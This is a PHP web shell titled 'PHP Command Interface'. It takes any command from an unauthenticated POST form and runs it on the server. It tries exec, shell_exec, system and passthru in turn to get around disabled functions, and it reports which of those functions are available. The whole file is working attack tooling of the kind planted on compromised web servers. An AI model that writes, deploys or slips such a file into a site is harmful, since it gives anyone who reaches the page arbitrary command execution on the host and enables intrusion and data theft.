<?php
// Handle command execution
$command = '';
$output = '';
$error = '';

if ($_POST['command'] ?? false) {
  $command = trim($_POST['command']);
  
  if (!empty($command)) {
      // Try different methods to execute commands
      $output = executeCommand($command);
  }
}

function executeCommand($command) {
  $output = '';
  $error = '';
  
  // Method 1: Try exec()
  if (function_exists('exec')) {
      $result = [];
      $return_var = 0;
      exec($command . ' 2>&1', $result, $return_var);
      
      if ($return_var === 0) {
          return implode("\n", $result);
      } else {
          return "Error (exit code: $return_var):\n" . implode("\n", $result);
      }
  }
  
  // Method 2: Try shell_exec()
  if (function_exists('shell_exec')) {
      $result = shell_exec($command . ' 2>&1');
      if ($result !== null) {
          return $result;
      }
  }
  
  // Method 3: Try system()
  if (function_exists('system')) {
      ob_start();
      $return_var = 0;
      system($command . ' 2>&1', $return_var);
      $result = ob_get_clean();
      
      if ($return_var === 0) {
          return $result;
      } else {
          return "Error (exit code: $return_var):\n" . $result;
      }
  }
  
  // Method 4: Try passthru()
  if (function_exists('passthru')) {
      ob_start();
      $return_var = 0;
      passthru($command . ' 2>&1', $return_var);
      $result = ob_get_clean();
      
      if ($return_var === 0) {
          return $result;
      } else {
          return "Error (exit code: $return_var):\n" . $result;
      }
  }
  
  // If all methods fail
  return "Error: All command execution functions are disabled on this server.\n" .
         "Disabled functions: proc_open, exec, shell_exec, system, passthru\n" .
         "Please contact your hosting provider or use a different server.";
}

// Function to check which functions are available
function getAvailableFunctions() {
  $functions = ['proc_open', 'exec', 'shell_exec', 'system', 'passthru'];
  $available = [];
  $disabled = [];
  
  foreach ($functions as $func) {
      if (function_exists($func)) {
          $available[] = $func;
      } else {
          $disabled[] = $func;
      }
  }
  
  return ['available' => $available, 'disabled' => $disabled];
}

$functionStatus = getAvailableFunctions();
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PHP Command Interface</title>
  <style>
      body {
          font-family: 'Courier New', monospace;
          background-color: #1a1a1a;
          color: #00ff00;
          margin: 0;
          padding: 20px;
      }
      
      .container {
          max-width: 800px;
          margin: 0 auto;
      }
      
      .header {
          text-align: center;
          margin-bottom: 30px;
      }
      
      .status-info {
          background-color: #2a2a2a;
          padding: 15px;
          border-radius: 5px;
          margin-bottom: 20px;
          font-size: 12px;
      }
      
      .available {
          color: #00ff00;
      }
      
      .disabled {
          color: #ff4444;
      }
      
      .command-form {
          background-color: #2a2a2a;
          padding: 20px;
          border-radius: 5px;
          margin-bottom: 20px;
      }
      
      .input-group {
          display: flex;
          gap: 10px;
          align-items: center;
      }
      
      .prompt {
          color: #00ff00;
          font-weight: bold;
      }
      
      #commandInput {
          flex: 1;
          background-color: #1a1a1a;
          border: 1px solid #00ff00;
          color: #00ff00;
          padding: 10px;
          font-family: 'Courier New', monospace;
          font-size: 14px;
          border-radius: 3px;
      }
      
      #commandInput:focus {
          outline: none;
          border-color: #00ff88;
          box-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
      }
      
      .btn {
          background-color: #00ff00;
          color: #1a1a1a;
          border: none;
          padding: 10px 20px;
          font-family: 'Courier New', monospace;
          font-weight: bold;
          cursor: pointer;
          border-radius: 3px;
          transition: background-color 0.3s;
      }
      
      .btn:hover {
          background-color: #00cc00;
      }
      
      .output-container {
          background-color: #0a0a0a;
          border: 1px solid #333;
          border-radius: 5px;
          padding: 15px;
          min-height: 200px;
          white-space: pre-wrap;
          font-family: 'Courier New', monospace;
          font-size: 13px;
          line-height: 1.4;
      }
      
      .command-echo {
          color: #ffff00;
          margin-bottom: 10px;
      }
      
      .output {
          color: #ffffff;
      }
      
      .error {
          color: #ff4444;
      }
      
      .empty-state {
          color: #666;
          font-style: italic;
      }
  </style>
</head>
<body>
  <div class="container">
      <div class="header">
          <h1>🖥️ PHP Command Interface</h1>
          <p>Enter a command and press Enter or click OK to execute</p>
      </div>
      
      <div class="status-info">
          <strong>Server Function Status:</strong><br>
          Available: <span class="available"><?php echo implode(', ', $functionStatus['available']) ?: 'None'; ?></span><br>
          Disabled: <span class="disabled"><?php echo implode(', ', $functionStatus['disabled']) ?: 'None'; ?></span>
      </div>
      
      <form method="POST" class="command-form" id="commandForm">
          <div class="input-group">
              <span class="prompt">$</span>
              <input 
                  type="text" 
                  name="command" 
                  id="commandInput" 
                  placeholder="Enter command here..." 
                  value="<?php echo htmlspecialchars($command); ?>"
                  autocomplete="off"
                  autofocus
              >
              <button type="submit" class="btn">OK</button>
          </div>
      </form>
      
      <div class="output-container">
          <?php if (!empty($command)): ?>
              <div class="command-echo">$ <?php echo htmlspecialchars($command); ?></div>
              <div class="output"><?php echo htmlspecialchars($output); ?></div>
          <?php else: ?>
              <div class="empty-state">Command output will appear here...</div>
          <?php endif; ?>
      </div>
  </div>

  <script>
      // Handle Enter key press
      document.getElementById('commandInput').addEventListener('keypress', function(e) {
          if (e.key === 'Enter') {
              document.getElementById('commandForm').submit();
          }
      });
      
      // Focus on input field when page loads
      document.getElementById('commandInput').focus();
  </script>
</body>
</html>